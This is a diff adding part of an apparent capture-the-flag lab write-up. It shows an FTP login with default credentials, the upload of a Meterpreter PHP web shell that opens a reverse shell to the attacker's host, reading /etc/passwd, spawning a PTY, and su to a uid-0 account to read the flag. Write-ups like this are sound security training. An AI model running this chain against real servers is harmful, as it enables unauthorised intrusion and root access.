@@ -410,4 +410,152 @@ msf6 exploit(multi/handler) > run
 
 We can now go ahead and upload the file to obtain a remote shell.
 
+<details> 
+  <summary> <b>Shell upload via FTP</b> </summary>
+  
+```bash
+
+┌──(root💀kali)-[~]
+└─# ftp 172.16.37.234 40121                                                                                 148 ⨯ 2 ⚙
+Connected to 172.16.37.234.
+220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
+Name (172.16.37.234:enrique): ftpuser
+331 Password required for ftpuser.
+Password:
+230 User ftpuser logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> cd html
+250 CWD command successful
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 root     root        11321 Mar 28  2019 index.html
+drwxrwxrwx   2 root     root         4096 Mar 28  2019 xyz
+226 Transfer complete.
+ftp> put meterpreter.php
+local: meterpreter.php remote: meterpreter.php
+200 PORT command successful
+150 Opening BINARY mode data connection for meterpreter.php
+226 Transfer complete.
+34276 bytes sent in 0.00 secs (93.3947 MB/s)
+ftp> 
+
+```
+</details>
+<br/>
+Ok, shell is up. We now need to activate it by visiting http://172.16.37.234:40180/meterpreter.php
+<br/>
+<img src="/assets/images/ctf3/meterpreter_browser_start.png" height="100%" width="100%">
+<br/>
+
+In our terminal we can observe that the Meterpreter session is open now:
+
+
+```bash
+
+[*] Started reverse TCP handler on 10.13.37.10:53 
+[*] Meterpreter session 1 opened (10.13.37.10:53 -> 172.16.37.234:47464) at 2021-02-16 11:56:35 -0500
+
+meterpreter > ls
+Listing: /var/www/html
+======================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100644/rw-r--r--  11321  fil   2019-03-28 03:40:36 -0400  index.html
+100644/rw-r--r--  34276  fil   2021-02-16 11:54:34 -0500  meterpreter.php
+40777/rwxrwxrwx   4096   dir   2019-03-28 03:55:17 -0400  xyz
+
+meterpreter > 
+
+```
+
+<br/>
+By viewing /etc/passwd we can see that our ftpuser is already a priviliged (uid: 0, which is effectively root):
+
+```bash
+
+meterpreter > shell
+Process 3023 created.
+Channel 0 created.
+bash -i
+bash: cannot set terminal process group (1105): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@xubuntu:/var/www/html$ tail /etc/passwd
+tail /etc/passwd
+hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:115:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:117:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:118:127::/var/lib/saned:/bin/false
+usbmux:x:119:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+speech-dispatcher:x:120:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+elsuser:x:1000:1000:elsuser,,,:/home/elsuser:/bin/bash
+ftpuser:x:0:0::/home/ftpuser:/bin/bash
+test:x:1001:1002::/home/test:
+www-data@xubuntu:/var/www/html$ 
+
+``` 
+
+The logical thing now is to execute the below to escalate privileges.
+
+```bash
+$ su ftpuser
+```
+
+<br/>
+we get this error:
+<br/>
+
+```bash
+ww-data@xubuntu:/var/www/html$ su ftpuser
+su ftpuser
+su: must be run from a terminal
+www-data@xubuntu:/var/www/html$ 
+```
+<br/>
+Meaning we can't execute due to lack of terminal. 
+However, we can spawn a terminal with Python:
+<br/>
+
+```bash
+ww-data@xubuntu:/var/www/html$ python -c 'import pty;pty.spawn("/bin/bash")';
+<tml$ python -c 'import pty;pty.spawn("/bin/bash")';                         
+www-data@xubuntu:/var/www/html$ 
+```
+<br/>
+
+We find the flag in /var/www
+
+```bash
+
+www-data@xubuntu:/var/www/html$ ls -la
+ls -la
+total 60
+drwxr-xr-x 3 root root  4096 Feb 16 16:54 .
+drwxr-xr-x 3 root root  4096 Feb 15 20:08 ..
+-rw-r--r-- 1 root root 11321 Mar 28  2019 index.html
+-rw-r--r-- 1 root root 34276 Feb 16 16:54 meterpreter.php
+drwxrwxrwx 2 root root  4096 Mar 28  2019 xyz
+www-data@xubuntu:/var/www/html$ cd ..
+cd ..
+www-data@xubuntu:/var/www$ ls -la
+ls -la
+total 16
+drwxr-xr-x  3 root root 4096 Feb 15 20:08 .
+drwxr-xr-x 15 root root 4096 Apr 26  2019 ..
+-rw-------  1 root root   27 Apr 26  2019 .flag.txt
+drwxr-xr-x  3 root root 4096 Feb 16 16:54 html
+www-data@xubuntu:/var/www$ 
+
+www-data@xubuntu:/var/www$ su ftpuser
+su ftpuser
+Password: ftpuser
+
+root@xubuntu:/var/www# cat .flag.txt
+cat .flag.txt
+You got the first machine!
+root@xubuntu:/var/www# 
+```
 
